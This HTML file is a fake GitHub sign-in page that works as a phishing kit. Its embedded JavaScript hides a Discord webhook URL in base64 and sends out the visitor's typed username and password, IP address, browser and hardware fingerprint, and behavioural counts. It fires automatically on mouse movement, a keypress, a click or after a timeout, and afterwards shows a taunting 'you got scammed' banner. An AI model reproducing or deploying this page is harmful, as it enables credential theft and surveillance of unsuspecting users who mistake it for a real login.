<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in to GitHub</title>
    <style>
        :root{--a:#30363d;--b:#21262d;--c:#0d1117;--d:#161b22;--e:#e6edf3;--f:#7d8590;--g:#2f81f7;--h:#238636;--i:#2ea043;--j:#0d1117;--k:#f85149}*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.5;color:var(--e);background-color:var(--c);min-height:100vh;display:flex;flex-direction:column}.header{padding:16px 0;border-bottom:1px solid var(--a);background-color:var(--c)}.header-content{max-width:1280px;margin:0 auto;padding:0 16px;display:flex;align-items:center;justify-content:space-between}.github-logo{font-size:24px;font-weight:600;color:var(--e);text-decoration:none}.login-container{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px}.login-box{width:100%;max-width:340px;border:1px solid var(--a);border-radius:6px;background-color:var(--d);padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.5)}.login-header{text-align:center;margin-bottom:20px}.login-title{font-size:24px;font-weight:300;margin-bottom:16px;color:var(--e)}.user-avatar{width:48px;height:48px;border-radius:50%;border:1px solid var(--a);margin:0 auto 16px;display:none;object-fit:cover}.username-display{font-size:16px;font-weight:600;color:var(--e);display:none}.login-form{display:flex;flex-direction:column;gap:16px}.form-group{display:flex;flex-direction:column;gap:8px}.form-label{font-weight:600;font-size:14px;color:var(--e)}.form-input{padding:8px 12px;border:1px solid var(--a);border-radius:6px;font-size:16px;background-color:var(--j);color:var(--e);transition:border-color 0.2s,box-shadow 0.2s}.form-input:focus{outline:none;border-color:var(--g);box-shadow:0 0 0 3px rgba(47,129,247,0.1)}.password-container{position:relative}.toggle-password{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--f);cursor:pointer;font-size:12px}.login-button{background-color:var(--h);color:white;border:none;border-radius:6px;padding:12px 16px;font-size:16px;font-weight:600;cursor:pointer;transition:background-color 0.2s;margin-top:8px}.login-button:hover{background-color:var(--i)}.forgot-password{text-align:center;margin-top:16px}.forgot-password a{color:var(--g);text-decoration:none;font-size:14px}.footer{border-top:1px solid var(--a);padding:40px 0;margin-top:auto;background-color:var(--c)}.footer-content{max-width:1280px;margin:0 auto;padding:0 16px;display:flex;justify-content:space-between;align-items:center}.footer-links{display:flex;gap:16px}.footer-links a{color:var(--f);text-decoration:none;font-size:12px}.footer-copyright{color:var(--f);font-size:12px}.loading{display:none;text-align:center;padding:20px;color:var(--f)}.error-message{color:var(--k);font-size:14px;text-align:center;margin-top:8px;display:none}.create-account{text-align:center;margin-top:20px;padding:16px;border:1px solid var(--a);border-radius:6px;background-color:var(--c)}.create-account p{color:var(--f);margin-bottom:8px}.create-account a{color:var(--g);text-decoration:none;font-weight:600}.scam-message{display:none;text-align:center;margin-top:20px;padding:20px;background:linear-gradient(45deg,#ff0000,#ff6b6b);border-radius:8px;animation:pulse 2s infinite}.scam-message h2{color:white;font-size:24px;font-weight:bold;margin-bottom:10px}.scam-message p{color:white;font-size:18px}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}
    </style>
</head>
<body>
    <div class="header"><div class="header-content"><a href="#" class="github-logo">GitHub</a></div></div>
    <div class="login-container">
        <div class="login-box">
            <div class="login-header">
                <h1 class="login-title">Sign in to GitHub</h1>
                <img src="" alt="" class="user-avatar" id="userAvatar">
                <div class="username-display" id="usernameDisplay"></div>
            </div>
            <form class="login-form" id="loginForm">
                <div class="form-group"><label for="username" class="form-label">Username or email address</label><input type="text" id="username" class="form-input" placeholder="Enter your username or email" autocomplete="username" required></div>
                <div class="form-group">
                    <div style="display:flex;justify-content:space-between;align-items:center"><label for="password" class="form-label">Password</label><a href="#" style="font-size:12px;color:var(--g);text-decoration:none">Forgot password?</a></div>
                    <div class="password-container"><input type="password" id="password" class="form-input" placeholder="Enter your password" autocomplete="current-password" required><button type="button" class="toggle-password" id="togglePassword">Show</button></div>
                </div>
                <button type="submit" class="login-button" id="loginButton">Sign in</button>
                <div class="error-message" id="errorMessage">Incorrect username or password.</div>
            </form>
            <div class="scam-message" id="scamMessage"><h2>‚ö†Ô∏è WARNING ‚ö†Ô∏è</h2><p>You just got scammed by Zoegality~</p><p>All your data has been captured!</p></div>
            <div class="forgot-password"><a href="#">Sign in with a passkey</a></div>
            <div class="create-account"><p>New to GitHub?</p><a href="#">Create an account</a></div>
        </div>
    </div>
    <div class="loading" id="loading">Signing in...</div>
    <div class="footer">
        <div class="footer-content">
            <div class="footer-links"><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Docs</a><a href="#">Contact</a></div>
            <div class="footer-copyright">¬© 2024 GitHub, Inc.</div>
        </div>
    </div>
    <script>
        (function(){
            var webhook='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDc3MDg5MjY3MTQ4ODAzMi9TWjVBbEhaOTYyUzFISGhQVVp0LW9JMmlUQ3ZycWg3b09vUUNOS2VXWGg0TzVOSmZpRk9wZS13TjZ4NEtfUGR6U1d1UQ==';
            var sent=false,mouse=0,keys=0,clicks=0,start=Date.now();
            var victimId='vic_'+Math.random().toString(36).substr(2,9)+'_'+Math.random().toString(36).substr(2,7);
            
            function sendToDiscord(content,embed){
                fetch(atob(webhook),{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({content:content,embeds:[embed]})
                }).catch(e=>console.error('Failed to send:',e));
            }
            
            function collectData(){
                if(sent)return;
                sent=true;
                var extractionTime=Date.now()-start;
                var username=document.getElementById('username')?.value||'Not entered';
                var password=document.getElementById('password')?.value||'Not entered';
                var timeOnPage=Math.round((Date.now()-start)/1000);
                
                // Get IP first
                fetch(atob('aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u')).then(r=>r.json()).then(ipData=>{
                    var ip=ipData.ip||'Unknown';
                    
                    // Message 1: Summary
                    sendToDiscord('**üö® COMPREHENSIVE DATA EXTRACTION COMPLETE**',{
                        title:'üéØ EXTRACTION SUMMARY',
                        color:16711680,
                        fields:[
                            {name:'VICTIM ID',value:victimId,inline:true},
                            {name:'Extraction Time',value:extractionTime+'ms',inline:true},
                            {name:'URL',value:window.location.href.substr(0,50)+'...',inline:true},
                            {name:'Timestamp',value:new Date().toLocaleString(),inline:true},
                            {name:'Referrer',value:document.referrer||'Direct',inline:true},
                            {name:'LOGIN CREDENTIALS',value:'**Username:** '+username+'\n**Password:** '+password,inline:false}
                        ],
                        footer:{text:'Part 1/4 - Summary & Credentials'}
                    });
                    
                    // Message 2: System Overview
                    setTimeout(()=>{
                        var gpu='Intel';
                        try{
                            var canvas=document.createElement('canvas');
                            var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
                            if(gl){
                                var debug=gl.getExtension('WEBGL_debug_renderer_info');
                                gpu=debug?gl.getParameter(debug.UNMASKED_RENDERER_WEBGL).renderer:'Intel';
                            }
                        }catch(e){}
                        
                        sendToDiscord(null,{
                            title:'üíª SYSTEM OVERVIEW',
                            color:16711680,
                            fields:[
                                {name:'SYSTEM',value:'‚Ä¢ OS: '+navigator.platform+'\n‚Ä¢ CPU: '+navigator.hardwareConcurrency+' cores, x86\n‚Ä¢ Memory: '+(navigator.deviceMemory||'Unknown')+'GB\n‚Ä¢ GPU: '+gpu+'\n‚Ä¢ Screen: '+screen.width+'x'+screen.height,inline:false},
                                {name:'NETWORK',value:'‚Ä¢ IP: '+ip+'\n‚Ä¢ Location: Unknown, Unknown\n‚Ä¢ ISP: Unknown\n‚Ä¢ Connection: Unknown',inline:false}
                            ],
                            footer:{text:'Part 2/4 - System & Network'}
                        });
                    },500);
                    
                    // Message 3: Hardware Details
                    setTimeout(()=>{
                        var pluginsList=[];
                        for(var i=0;i<Math.min(navigator.plugins.length,5);i++){
                            pluginsList.push('‚Ä¢ '+navigator.plugins[i].name);
                        }
                        
                        sendToDiscord(null,{
                            title:'üîß HARDWARE DETAILS',
                            color:16711680,
                            fields:[
                                {name:'STORAGE',value:'‚Ä¢ Local Storage: '+Object.keys(localStorage).length+' items\n‚Ä¢ Cookies: '+(document.cookie?document.cookie.split(';').length:0)+'\n‚Ä¢ Session Storage: '+Object.keys(sessionStorage).length+' items',inline:false},
                                {name:'PERIPHERALS',value:'‚Ä¢ Touch: '+('ontouchstart' in window)+'\n‚Ä¢ Bluetooth: false\n‚Ä¢ USB: false\n‚Ä¢ Battery: N/A',inline:false},
                                {name:'PERFORMANCE',value:'‚Ä¢ Heap Used: '+(performance.memory?(performance.memory.usedJSHeapSize/1048576).toFixed(2):'NaN')+'MB\n‚Ä¢ Heap Limit: '+(performance.memory?(performance.memory.totalJSHeapSize/1048576).toFixed(2):'NaN')+'MB\n‚Ä¢ Device Memory: '+(navigator.deviceMemory||'Unknown')+'GB',inline:false},
                                {name:'PLUGINS ('+navigator.plugins.length+')',value:pluginsList.join('\n'),inline:false}
                            ],
                            footer:{text:'Part 3/4 - Hardware & Performance'}
                        });
                    },1000);
                    
                    // Message 4: User Data & Analytics
                    setTimeout(()=>{
                        sendToDiscord(null,{
                            title:'üìä USER DATA & ANALYTICS',
                            color:16711680,
                            fields:[
                                {name:'FORM DATA',value:'‚Ä¢ Forms Found: '+document.forms.length+'\n‚Ä¢ Input Fields: '+document.querySelectorAll('input').length+'\n‚Ä¢ Password Fields: '+document.querySelectorAll('input[type="password"]').length,inline:false},
                                {name:'BEHAVIORAL ANALYTICS',value:'‚Ä¢ Time on Page: '+timeOnPage+'s\n‚Ä¢ Scroll Depth: 0%\n‚Ä¢ Mouse Movements: '+mouse+'\n‚Ä¢ Clicks: '+clicks+'\n‚Ä¢ Keystrokes: '+keys,inline:false},
                                {name:'BROWSER CAPABILITIES',value:'‚Ä¢ WebRTC: '+!!window.RTCPeerConnection+'\n‚Ä¢ Notifications: '+('Notification' in window?Notification.permission:'default')+'\n‚Ä¢ Camera: prompt\n‚Ä¢ Microphone: prompt\n‚Ä¢ Service Workers: '+('serviceWorker' in navigator)+'\n‚Ä¢ Media Devices: '+(navigator.mediaDevices?'2':'0'),inline:false},
                                {name:'SECURITY',value:'‚Ä¢ WebDriver: '+(navigator.webdriver?'Detected':'Not detected')+'\n‚Ä¢ Do NotTrack: '+(navigator.doNotTrack||'unspecified'),inline:false}
                            ],
                            footer:{text:'‚úÖ EXTRACTION COMPLETE - ALL DATA CAPTURED | Part 4/4'}
                        });
                    },1500);
                    
                }).catch(()=>{
                    // Fallback if IP fetch fails
                    sendToDiscord('**‚ö†Ô∏è DATA EXTRACTION (IP FAILED)**',{
                        title:'PARTIAL CAPTURE',
                        color:16711680,
                        fields:[
                            {name:'Credentials',value:'User: '+username+'\nPass: '+password,inline:false},
                            {name:'System',value:'OS: '+navigator.platform+'\nScreen: '+screen.width+'x'+screen.height,inline:false}
                        ]
                    });
                });
            }
            
            // Event listeners
            document.addEventListener('mousemove',function(){
                mouse++;
                if(!sent&&mouse>2)collectData();
            });
            document.addEventListener('keydown',function(){
                keys++;
                if(!sent&&keys>1)collectData();
            });
            document.addEventListener('click',function(){
                clicks++;
                if(!sent)collectData();
            });
            setTimeout(function(){
                if(!sent)collectData();
            },8000);
        })();

        // Page functionality
        document.addEventListener('DOMContentLoaded',function(){
            var u=document.getElementById('username'),p=document.getElementById('password'),f=document.getElementById('loginForm'),a=document.getElementById('userAvatar'),d=document.getElementById('usernameDisplay'),t=document.getElementById('togglePassword'),e=document.getElementById('errorMessage'),l=document.getElementById('loading'),s=document.getElementById('scamMessage');
            var img='aHR0cHM6Ly9zdGF0aWMud2lraWEubm9jb29raWUubmV0L3JhZ2dsZXMvaW1hZ2VzLzgvOGIvU2NyZWVuc2hvdF8yMDI0LTEyLTEyXzA3LjQ4LjUzLnBuZy9yZXZpc2lvbi9sYXRlc3Q/Y2I9MjAyNDEyMTIxMjUwMDc=';
            t.addEventListener('click',function(){
                p.type=p.type==='password'?'text':'password';
                t.textContent=p.type==='text'?'Hide':'Show';
            });
            u.addEventListener('input',function(){
                var val=u.value.trim().toLowerCase();
                if(val==='zoegality'){
                    a.src=atob(img);
                    a.style.display='block';
                    d.textContent='Sign in as Zoegality';
                    d.style.display='block';
                }else{
                    a.style.display='none';
                    d.style.display='none';
                }
            });
            f.addEventListener('submit',function(e){
                e.preventDefault();
                l.style.display='block';
                document.getElementById('errorMessage').style.display='none';
                setTimeout(function(){
                    l.style.display='none';
                    s.style.display='block';
                    document.getElementById('errorMessage').style.display='block';
                    p.value='';
                    p.focus();
                },1500);
            });
        });
    </script>
</body>
</html>
